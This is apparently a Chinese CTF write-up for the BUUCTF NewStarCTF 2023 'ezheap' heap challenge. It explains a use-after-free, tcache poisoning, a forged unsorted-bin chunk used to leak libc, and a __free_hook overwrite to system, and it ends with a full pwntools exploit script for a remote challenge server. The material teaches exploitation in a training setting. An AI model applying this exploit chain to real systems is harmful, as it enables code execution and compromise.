---
title: BUUCTF-NewStarCTF-2023-ezheap 题解
date: 2026-01-16 21:49:00
tags: 
    - heap
    - UAF
    - tcache poisoning
    - pwn
    - BUUCTF
categories: BUUCTF 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]ezheap)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-ezheap/checksec.png)

全开

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-ezheap/main.png)

菜单题

#### menu

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-ezheap/menu.png)

#### add

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-ezheap/add.png)

一次 add 申请两个 chunk ，记为 **head_chunk** 和 **content_chunk**

#### delete

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-ezheap/delete.png)

有明显的 UAF 漏洞

#### show

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-ezheap/show.png)

delete 后仍可以 show

#### edit

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-ezheap/edit.png)

delete 后仍可以 edit

#### read_idx

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-ezheap/read_idx.png)

#### read_size

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-2023-ezheap/read_size.png)

### 攻击思路

由于一次 add 申请两个 chunk ，而一次 delete 只 free 掉 head_chunk 且不清空数据，而 delete 后仍可以 edit，所以我们可以通过两次 delete 和一次 add 获得一个 head_chunk 的控制权，进而利用 edit/show 实现 AAW/AAR 

同时，在上面的操作之前 delete 掉一个 head_chunk 使之进入 tcache ，我们可以利用 chunk 的残留值泄露堆地址，实现对堆的完全控制

然而由于我们并没有操作栈的机会，也没有办法劫持 got 表，因此我们考虑去劫持 __free_hook 函数，这需要泄露 libc 基址

由于 tcache 的结构存在于堆上，而 fastbin 为单向链表，我们没有办法通过它们去泄露 libc 基址，因此考虑 unsorted_bin ，因为进入 unsorted_bin 的 chunk 的 fd/bk 指向 arena ，而 arena 与 libc 基址的相对偏移固定

由于强行塞满 tcache 所需的 chunk 数量过多，不方便操作，因此我们考虑直接修改位于堆上的 counts 数组，使 tcache 看起来是满的

为了绕开 fastbin ，我们考虑使用 size 为 0x90 的 chunk ，同时把对应 tcache 的 counts 设为 7

但是程序只允许 free 掉 0x30 的 chunk ，所以我们需要伪造一个 fake chunk 去绕过安全检测

我们需要伪造的有：
- chunk_size = 0x91
- chunk_prev_size = 0x30
- next_chunk_prev_size = 0x90
- next_chunk_prev_inuse_bit = 1
- next_chunk_size 合法，且保险起见，不要让它与 top_chunk 重叠

利用 AAW 伪造完成后， delete 掉 fake_chunk 即可使之进入 unsorted_bin ，再利用 AAR 即可泄露 libc 基址

最后利用 AAW 劫持 __free_hook 为 system 并往一个 head_chunk 中写入 `/bin/sh\x00` ，再 delete 掉这个 head_chunk 即可提权

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	p = process('./pwn')
else:
	p = remote('node5.buuoj.cn', 28814)

def padd(idx, size, content):
	p.recvuntil(b'>>\n')
	p.sendline(b'1')
	p.recvuntil(b'idx(0~15): ')
	p.sendline(str(idx).encode())
	p.recvuntil(b'size: ')
	p.sendline(str(size).encode())
	p.recvuntil(b'note: ')
	p.sendline(content)

def pdelete(idx):
	p.recvuntil(b'>>\n')
	p.sendline(b'2')
	p.recvuntil(b'idx(0~15): ')
	p.sendline(str(idx).encode())

def pshow(idx):
	p.recvuntil(b'>>\n')
	p.sendline(b'3')
	p.recvuntil(b'idx(0~15): ')
	p.sendline(str(idx).encode())

def pedit(idx, content):
	p.recvuntil(b'>>\n')
	p.sendline(b'4')
	p.recvuntil(b'idx(0~15): ')
	p.sendline(str(idx).encode())
	p.recvuntil(b'content: ')
	p.send(content)
	
def pwrite(addr, val):
	payload = p64(0x20) + b'\x00' * 0x10 + p64(addr)
	pedit(2, payload)
	pedit(0, val)
	
def pread(addr):
	payload = p64(0x20) + b'\x00' * 0x10 + p64(addr)
	pedit(2, payload)
	pshow(0)
	
def attack():
	padd(3, 0x20, b'')
	padd(0, 0x20, b'')
	padd(1, 0x20, b'')
	pdelete(3)
	pdelete(0)
	pdelete(1)
	padd(2, 0x20, b'')                        
	pshow(2)
	p.recvuntil(b'\n')
	heap3_addr = u64(p.recv(6).ljust(8, b'\x00'))
	log.info(f'heap3_addr = {hex(heap3_addr)}')
	pwrite(heap3_addr // 0x1000 * 0x1000 + 0x10 + 0x2 * 7, p64(7))
	padd(4, 0x28, b'A' * 0x20 + p64(0x30))
	padd(5, 0x70, b'')
	pwrite(heap3_addr + 0x28 + 6 * 0x30, p64(0x91))
	pwrite(heap3_addr + 0x28 + 6 * 0x30 + 0x90, p64(0x21))
	pwrite(heap3_addr + 0x28 + 6 * 0x30 + 0x90 - 8, p64(0x90))
	pdelete(5)
	pread(heap3_addr + 0x28 + 6 * 0x30 + 0x8)
	p.recvuntil(b'\n')
	bins0_addr = u64(p.recv(6).ljust(8, b'\x00'))
	log.info(f'bins0_addr = {hex(bins0_addr)}')
	libc_addr = bins0_addr - 0x1cabe0
	log.info(f'libc_addr = {hex(libc_addr)}')
	__free_hook_addr = libc_addr + 0x1cce48
	log.info(f'__free_hook_addr = {hex(__free_hook_addr)}')
	system_addr = libc_addr + 0x30290
	log.info(f'system_addr = {hex(system_addr)}')
	pwrite(heap3_addr, b'/bin/sh\x00')
	pwrite(__free_hook_addr, p64(system_addr))
	pdelete(4)
	p.interactive()

attack()
```